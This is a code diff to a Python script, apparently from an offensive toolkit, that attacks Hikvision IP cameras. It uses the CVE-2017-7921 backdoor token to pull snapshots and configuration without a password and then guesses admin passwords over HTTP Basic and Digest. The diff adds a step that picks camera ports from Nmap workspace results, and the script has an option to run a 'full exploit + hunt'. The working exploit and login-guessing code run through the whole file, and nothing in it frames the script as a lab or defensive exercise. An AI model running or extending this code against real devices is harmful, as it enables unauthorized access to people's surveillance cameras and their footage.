@@ -53,9 +53,30 @@ def decode_backdoor() -> str:
     return raw.replace("\n", "")
 
 
-def test_backdoor(host: str) -> dict:
+def _base_url(host: str, port: int) -> str:
+    if port in (443, 8443):
+        return f"https://{host}" if port == 443 else f"https://{host}:{port}"
+    if port == 80:
+        return f"http://{host}"
+    return f"http://{host}:{port}"
+
+
+def _ports_for_host(host: str) -> list[int]:
+    import os
+
+    from core.paths import project_root
+    from core.workspace_ports import load_open_ports_from_workspace, prefer_web_ports
+
+    td = os.environ.get("ENGINE_WORKSPACE") or os.path.join(project_root(), "targets", host)
+    cached = load_open_ports_from_workspace(td)
+    if cached:
+        return prefer_web_ports(cached, camera_first=True)
+    return [80, 8000]
+
+
+def test_backdoor(host: str, port: int = 80) -> dict:
     """Backdoor bypass — snapshot/config without real password."""
-    base = f"http://{host}"
+    base = _base_url(host, port)
     auth_q = f"?auth={BACKDOOR_B64}"
     session = _session()
     results = {}
@@ -82,9 +103,9 @@ def test_backdoor(host: str) -> dict:
     return results
 
 
-def test_digest_login(host: str, username: str, password: str) -> dict:
+def test_digest_login(host: str, username: str, password: str, port: int = 80) -> dict:
     """Real login via HTTP Digest (what Router Scan validates)."""
-    base = f"http://{host}"
+    base = _base_url(host, port)
     session = _session()
     digest = HTTPDigestAuth(username, password)
     hits = []
@@ -113,9 +134,9 @@ def test_digest_login(host: str, username: str, password: str) -> dict:
     return {"username": username, "password": password, "valid": any_ok, "checks": hits}
 
 
-def test_basic_login(host: str, username: str, password: str) -> dict:
+def test_basic_login(host: str, username: str, password: str, port: int = 80) -> dict:
     """Basic auth (usually fails on Hikvision — included to show the difference)."""
-    base = f"http://{host}"
+    base = _base_url(host, port)
     session = _session()
     try:
         r = session.get(f"{base}/ISAPI/Security/userCheck", auth=(username, password), timeout=12)
@@ -150,15 +171,19 @@ def main() -> int:
     p.add_argument("--full", action="store_true", help="Run full exploit + hunt from main.py modules")
     args = p.parse_args()
     host = args.host.strip()
+    http_ports = _ports_for_host(host)
+    primary_port = http_ports[0]
+    if len(http_ports) > 1:
+        print(f"[*] Nmap workspace ports: {http_ports} — testing HTTP on {primary_port} first")
 
     print("=" * 70)
     print(f"  HIKVISION CREDENTIAL TEST — {host}")
-    print(f"  Login page: http://{host}/doc/page/login.asp")
+    print(f"  Login page: {_base_url(host, primary_port)}/doc/page/login.asp")
     print("=" * 70)
 
     print("\n[1] CVE-2017-7921 BACKDOOR (bypass — NOT the real web password)")
     print(f"    Decoded bypass token: {decode_backdoor()}")
-    backdoor = test_backdoor(host)
+    backdoor = test_backdoor(host, primary_port)
     for name, info in backdoor.items():
         status = info.get("status", "?")
         ok = info.get("ok", False)
@@ -168,7 +193,7 @@ def main() -> int:
 
     print("\n[2] HTTP BASIC auth (admin + test passwords) — expect FAIL on Hikvision")
     for pw in ("11", ROUTER_SCAN_PASSWORD):
-        basic = test_basic_login(host, "admin", pw)
+        basic = test_basic_login(host, "admin", pw, primary_port)
         mark = "[+]" if basic.get("valid") else "[-]"
         print(f"    {mark} admin:{pw} -> {basic}")
 
@@ -182,7 +207,7 @@ def main() -> int:
         if pw in seen:
             continue
         seen.add(pw)
-        result = test_digest_login(host, "admin", pw)
+        result = test_digest_login(host, "admin", pw, primary_port)
         mark = "[+]" if result["valid"] else "[-]"
         print(f"    {mark} admin:{pw} -> valid={result['valid']}")
         for check in result["checks"]:
@@ -193,9 +218,14 @@ def main() -> int:
             break
 
     print("\n[4] CVE INTELLIGENCE (firmware → CVE map)")
+    from engines.device_cve_checker import assess_hikvision, print_cve_report
+
     auth_tuple = ("admin", found_real) if found_real else None
-    intel = assess_hikvision(host, auth=auth_tuple)
-    print_cve_report(intel)
+    try:
+        intel = assess_hikvision(host, port=primary_port, auth=auth_tuple)
+        print_cve_report(intel)
+    except Exception as exc:
+        print(f"    [!] CVE intelligence skipped: {exc}")
 
     print("\n" + "=" * 70)
     print("  CONCLUSION")
@@ -208,7 +238,7 @@ def main() -> int:
     else:
         print("  Real password not confirmed in this run.")
         print(f"  Try manually: admin:{ROUTER_SCAN_PASSWORD} on login page")
-        print(f"  http://{host}/doc/page/login.asp")
+        print(f"  {_base_url(host, primary_port)}/doc/page/login.asp")
     print("=" * 70)
 
     if args.full:
